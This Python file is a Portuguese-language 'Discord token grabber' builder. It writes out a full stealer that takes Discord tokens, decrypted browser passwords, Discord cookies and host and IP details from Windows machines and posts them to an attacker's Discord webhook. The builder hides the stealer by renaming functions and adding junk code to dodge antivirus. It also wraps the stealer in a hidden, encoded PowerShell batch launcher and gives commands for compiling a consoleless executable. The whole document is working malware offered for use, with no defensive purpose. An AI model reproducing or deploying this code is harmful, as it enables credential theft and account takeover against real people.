#!/usr/bin/env python3
"""
DISCORD TOKEN GRABBER BUILDER v3.0
Gera grabber em Python ofuscado + webhook delivery
"""

import os, sys, base64, zlib, json, random, string

WEBHOOK_DEFAULT = "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI"

GRABBER_TEMPLATE = '''import os,sys,subprocess,base64,zlib,json,ctypes,struct,urllib.request,re,platform,glob,shutil,sqlite3,win32crypt,browser_cookie3,requests as r
from datetime import datetime as dt

WEBHOOK = "{WEBHOOK}"
USER = os.getenv("USERNAME") or os.getenv("USER") or "unknown"
HOST = platform.node()

def decrypt_pwd(data):
    try: return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode()
    except: return ""

def extract_discord():
    tokens = []
    paths = [
        os.getenv("LOCALAPPDATA")+"\\\\Discord\\\\Local Storage\\\\leveldb",
        os.getenv("APPDATA")+"\\\\Discord\\\\Local Storage\\\\leveldb",
        os.getenv("LOCALAPPDATA")+"\\\\DiscordCanary\\\\Local Storage\\\\leveldb",
        os.getenv("APPDATA")+"\\\\DiscordCanary\\\\Local Storage\\\\leveldb",
        os.getenv("LOCALAPPDATA")+"\\\\DiscordPTB\\\\Local Storage\\\\leveldb",
        os.getenv("APPDATA")+"\\\\DiscordPTB\\\\Local Storage\\\\leveldb",
        os.getenv("LOCALAPPDATA")+"\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb",
        os.getenv("LOCALAPPDATA")+"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb",
        os.getenv("LOCALAPPDATA")+"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb",
    ]
    for path in paths:
        if os.path.exists(path):
            for f in glob.glob(path+"\\\\*.ldb")+glob.glob(path+"\\\\*.log"):
                try:
                    with open(f,"rb",errors="ignore") as fp:
                        data = fp.read().decode("utf-8",errors="ignore")
                        for match in re.finditer(r'[A-Za-z0-9_-]{{23,28}}\\.[A-Za-z0-9_-]{{6,7}}\\.[A-Za-z0-9_-]{{27,}}', data):
                            tk = match.group()
                            if tk not in tokens:
                                tokens.append(tk)
                except:
                    pass
    return tokens

def get_passwords():
    pwd_list = []
    chrome_paths = [
        os.getenv("LOCALAPPDATA")+"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data",
        os.getenv("LOCALAPPDATA")+"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Login Data",
        os.getenv("LOCALAPPDATA")+"\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data",
    ]
    for db_path in chrome_paths:
        if os.path.exists(db_path):
            try:
                shutil.copy2(db_path, "temp.db")
                conn = sqlite3.connect("temp.db")
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    pwd = decrypt_pwd(row[2])
                    if pwd:
                        pwd_list.append(f"{{row[0]}} | {{row[1]}} | {{pwd}}")
                conn.close()
                os.remove("temp.db")
            except:
                pass
    return pwd_list

def get_cookies():
    try:
        cookies = []
        for domain in [".discord.com", "discord.com"]:
            for c in browser_cookie3.load(domain_name=domain):
                cookies.append(f"{{c.name}}={{c.value}}")
        return cookies
    except:
        return []

def get_info():
    info = []
    info.append(f"**User:** {{USER}}")
    info.append(f"**Host:** {{HOST}}")
    info.append(f"**OS:** {{platform.system()}} {{platform.release()}}")
    info.append(f"**IP:** {{r.get('https://api.ipify.org').text}}")
    info.append(f"**Local:** {{dt.now().strftime('%Y-%m-%d %H:%M:%S')}}")
    return "\\\\n".join(info)

def send():
    tokens = extract_discord()
    pwd_list = get_passwords()
    cookies = get_cookies()
    info = get_info()
    
    msg = {{
        "username": "Grabber v3",
        "content": ""
    }}
    
    # Tokens
    if tokens:
        msg["embeds"] = [{{"title": f"✅ Tokens: {{len(tokens)}}","description": "\\\\n".join(tokens[:5]),"color": 0x00ff00}}]
    else:
        msg["embeds"] = [{{"title": "❌ Nenhum token","color": 0xff0000}}]
    
    # Info
    msg["content"] = info
    
    r.post(WEBHOOK, json=msg)
    
    # Passwords em webhook separado
    if pwd_list:
        for i in range(0, len(pwd_list), 10):
            chunk = pwd_list[i:i+10]
            r.post(WEBHOOK, json={{"content": f"**Passwords {{i//10+1}}:**\\\\n"+"\\\\n".join(chunk)}})
    
    # Cookies
    if cookies:
        r.post(WEBHOOK, json={{"content": f"**Cookies Discord:**\\\\n"+"\\\\n".join(cookies[:10])}})
    
    # Tokens extras
    if len(tokens) > 5:
        for i in range(5, len(tokens), 10):
            chunk = tokens[i:i+10]
            r.post(WEBHOOK, json={{"content": "\\\\n".join(chunk)}})

try:
    send()
except:
    pass
'''

# ── ESMAGAMENTO / OFUSCAÇÃO ──

def obfuscate_python(code):
    """Ofusca o código Python pra bypassar AV básico"""
    
    # Substitui nomes de função por hash
    funcs = ['extract_discord', 'get_passwords', 'get_cookies', 'get_info', 'send', 'decrypt_pwd']
    for f in funcs:
        fhash = '_' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        code = code.replace(f'def {f}', f'def {fhash}')
        code = code.replace(f'{f}()', f'{fhash}()')
        code = code.replace(f'{f}(' + "'", f'{fhash}(' + "'")
    
    # Adiciona junk code
    junk = f'''
def _{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6))}():
    {" " * random.randint(0, 4)}pass
def _{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))}():
    {" " * random.randint(0, 4)}return {random.randint(0, 999)}
def _{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=7))}():
    {" " * random.randint(0, 4)}return lambda x: x * {random.randint(2, 99)}
'''
    code = junk + '\n' + code
    
    # Remove comentários
    lines = code.split('\n')
    code = '\n'.join([l for l in lines if not l.strip().startswith('#')])
    
    return code


def build_py():
    """Gera .py do grabber"""
    webhook = input(f"🌐 Webhook URL [{WEBHOOK_DEFAULT}]: ").strip() or WEBHOOK_DEFAULT
    
    code = GRABBER_TEMPLATE.format(WEBHOOK=webhook)
    code = obfuscate_python(code)
    
    output = "grabber.py"
    with open(output, 'w') as f:
        f.write(code)
    
    print(f"\n✅ Grabber Python salvo: {output} ({len(code)} bytes)")
    
    # Also save a clean version
    clean = GRABBER_TEMPLATE.format(WEBHOOK=webhook)
    with open("grabber_clean.py", 'w') as f:
        f.write(clean)
    print(f"✅ Versão limpa: grabber_clean.py")
    
    return code


def build_exe():
    """Gera .exe via pyinstaller (requer pyinstaller + Windows)"""
    print(f"\n⚠️ Para gerar .exe, precisa de Windows + pyinstaller:")
    print(f"   pip install pyinstaller")
    print(f"   pyinstaller --onefile --noconsole grabber.py")
    print(f"   Ou compila no Termux com: python -m nuitka grabber.py")
    print(f"   (mas nuitka não gera .exe no Linux, só no Windows)")


def build_batch():
    """Gera .bat que baixa e executa"""
    webhook = input(f"🌐 Webhook URL [{WEBHOOK_DEFAULT}]: ").strip() or WEBHOOK_DEFAULT
    
    ps_code = f'''
$wh = "{webhook}"
$code = @"
{GRABBER_TEMPLATE.format(WEBHOOK=webhook)}
"@
$code | Out-File -FilePath "$env:TEMP\\grabber.py" -Encoding utf8
python "$env:TEMP\\grabber.py"
'''
    b64 = base64.b64encode(ps_code.encode('utf-16le')).decode()
    
    bat = f'''@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}
'''
    with open("grabber_payload.bat", 'w') as f:
        f.write(bat)
    print(f"\n✅ Batch payload salvo: grabber_payload.bat")


def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(f"""{'='*60}
  DISCORD TOKEN GRABBER BUILDER v3.0
  Gera payload ofuscado pra Windows
{'='*60}
""")
    
    print("Formatos disponíveis:")
    print("  1) Python (.py) — ofuscado")
    print("  2) PowerShell + Batch (.bat)")
    print("  3) Python + instruções pra .exe")
    
    opt = input("\n➜ Escolhe (1-3) [1]: ").strip() or "1"
    webhook = input(f"🌐 Webhook URL [{WEBHOOK_DEFAULT}]: ").strip() or WEBHOOK_DEFAULT
    
    GRABBER_TEMPLATE_final = GRABBER_TEMPLATE.format(WEBHOOK=webhook)
    
    if opt == "1":
        code = obfuscate_python(GRABBER_TEMPLATE_final)
        with open("grabber.py", 'w') as f:
            f.write(code)
        print(f"\n✅ grabber.py — {len(code)} bytes ofuscado")
        with open("grabber_clean.py", 'w') as f:
            f.write(GRABBER_TEMPLATE_final)
        print(f"✅ grabber_clean.py — versão sem ofuscação")
        
    elif opt == "2":
        ps_code = f'''
$wh = "{webhook}"
$c = @"
{GRABBER_TEMPLATE_final}
"@
$c | Out-File "$env:TEMP\\discord_grab.py" -Encoding utf8
python "$env:TEMP\\discord_grab.py"
'''
        b64 = base64.b64encode(ps_code.encode('utf-16le')).decode()
        bat = f'''@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}'''
        with open("grabber_payload.bat", 'w') as f:
            f.write(bat)
        print(f"\n✅ grabber_payload.bat — {len(bat)} bytes")
        
    elif opt == "3":
        with open("grabber_clean.py", 'w') as f:
            f.write(GRABBER_TEMPLATE_final)
        print(f"\n✅ grabber_clean.py salvo")
        print(f"\n📌 Pra gerar .exE:")
        print(f"   pyinstaller --onefile --noconsole --hidden-import=win32crypt --hidden-import=browser_cookie3 grabber_clean.py")
        print(f"   Ou usa nuitka no Linux pra cross-compile:")
        print(f"   pip install nuitka")
        print(f"   python -m nuitka --standalone --onefile --windows-disable-console grabber_clean.py")

if __name__ == "__main__":
    main()
